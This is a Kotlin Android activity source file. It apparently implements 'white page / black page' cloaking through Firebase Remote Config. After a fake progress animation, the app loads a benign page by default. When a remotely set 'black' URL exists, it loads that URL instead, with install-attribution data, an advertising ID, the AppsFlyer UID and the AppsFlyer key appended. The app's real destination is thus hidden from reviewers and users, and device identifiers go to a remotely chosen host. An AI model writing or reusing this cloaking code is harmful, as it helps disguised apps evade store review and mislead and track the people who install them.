package com.pa.va.ma.tchi.appp

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.transition.ChangeBounds
import android.transition.Scene
import android.transition.TransitionManager
import android.widget.ImageView
import android.widget.ProgressBar
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.pa.va.ma.tchi.appp.Application49hus2.Application49hus2
import com.pa.va.ma.tchi.appp.databinding.ActivityMain49hus2Binding
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity49hus2 : AppCompatActivity() {

    private lateinit var binding49hus2: ActivityMain49hus2Binding

    @RequiresApi(Build.VERSION_CODES.M)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding49hus2 = ActivityMain49hus2Binding.inflate(layoutInflater)
        setContentView(binding49hus2.root)
        getPrefs49hus2().getLastPage49hus2()?.run {
            startActivity(Intent(this@MainActivity49hus2,WebViewActivity49hus2::class.java))
            finish()
        }

        firebase49hus2()
        val scene149hus2 = Scene.getSceneForLayout(binding49hus2.root, R.layout.scene_for_main_49hus2, this)
        binding49hus2.bStart49hus2.setOnClickListener {
            binding49hus2.bStart49hus2.isClickable = false
            TransitionManager.go(scene149hus2, ChangeBounds())
            findViewById<ImageView>(R.id.iv_logo_49hus2).animate().alpha(1f).run {
                startDelay = 2000
                duration = 1000
            }
            lifecycleScope.launch {
                val pb49hus2 = findViewById<ProgressBar>(R.id.pb_progress_49hus2)
                while (pb49hus2.progress < pb49hus2.max) {
                    pb49hus2.progress++
                    delay(50)
                }
                getURL49hus2()
                startActivity(Intent(this@MainActivity49hus2, WebViewActivity49hus2::class.java))
                finish()
            }
        }
    }




    companion object {
        var firebaseBlackKey49hus2 = "pablackpage"
        var firebaseDefaultKey49hus2 = "padefaultkey"
        var firebaseWhiteKey49hus2 = "pawhitepage"
        var firebaseDefaultValue49hus2: String? = null
        var firebaseWhiteValue49hus2: String? = null
        var firebaseBlackValue49hus2: String? = null
    }


    private fun firebase49hus2 () {
        Firebase.remoteConfig.run {
            setConfigSettingsAsync(
                remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 1000
                })
            setDefaultsAsync(mapOf(
                firebaseBlackKey49hus2 to "empty"
            ))
            fetchAndActivate().addOnCompleteListener {
                if (it.isSuccessful) {
                    firebaseBlackValue49hus2 = getString(firebaseBlackKey49hus2)
                    firebaseDefaultValue49hus2 = getString(firebaseDefaultKey49hus2)
                    firebaseWhiteValue49hus2 = getString(firebaseWhiteKey49hus2)
                }
            }
        }
    }

    private fun getURL49hus2 () {
        if (firebaseBlackValue49hus2 == null || firebaseBlackValue49hus2 == "empty") {
            getPrefs49hus2().putURL49hus2(firebaseWhiteValue49hus2?: return)
        } else {
            parseURL49hus2()
        }
    }

    private fun parseURL49hus2() {
        when (Application49hus2.status49hus2) {
            "Non-organic" -> {
                if (Application49hus2.key49hus2?.length == 20) {
                    getPrefs49hus2().putURL49hus2(
                        Uri.parse(firebaseBlackValue49hus2).buildUpon()
                            .appendQueryParameter("key", Application49hus2.key49hus2)
                            .appendQueryParameter("bundle", packageName)
                            .appendQueryParameter("sub2", Application49hus2.sub249hus2)
                            .appendQueryParameter("sub3", Application49hus2.sub349hus2)
                            .appendQueryParameter("sub4", Application49hus2.adGroup49hus2)
                            .appendQueryParameter("sub5", Application49hus2.adSet249hus2)
                            .appendQueryParameter("sub6", Application49hus2.afChannel49hus2)
                            .appendQueryParameter("sub7", Application49hus2.mediaSource49hus2)
                            .toString()
                            .plus("&sub10=${Application49hus2.APPSFLYER_UID49hus2}||${Application49hus2.aid49hus2}||${Application49hus2.APPSFLYER_KEY_49hus2}")
                    )
                } else {
                    parseDefault49hus2()
                }
            }
            else -> {
                getPrefs49hus2().putURL49hus2(
                    Uri.parse(firebaseBlackValue49hus2).buildUpon()
                        .appendQueryParameter("key", firebaseDefaultValue49hus2)
                        .appendQueryParameter("bundle", packageName)
                        .appendQueryParameter("sub7", "Organic")
                        .toString()
                        .plus("&sub10=${Application49hus2.APPSFLYER_UID49hus2}||${Application49hus2.aid49hus2}||${Application49hus2.APPSFLYER_KEY_49hus2}")
                )
            }
        }
    }

    private fun parseDefault49hus2 () {
        getPrefs49hus2().putURL49hus2(Uri.parse(firebaseBlackValue49hus2).buildUpon()
            .appendQueryParameter("key", firebaseDefaultValue49hus2)
            .appendQueryParameter("bundle",packageName)
            .appendQueryParameter("sub4", Application49hus2.adGroup49hus2)
            .appendQueryParameter("sub5", Application49hus2.adSet249hus2)
            .appendQueryParameter("sub6", Application49hus2.afChannel49hus2)
            .appendQueryParameter("sub7","Default")
            .toString()
            .plus("&sub10=${Application49hus2.APPSFLYER_UID49hus2}||${Application49hus2.aid49hus2}||${Application49hus2.APPSFLYER_KEY_49hus2}"))
    }
}
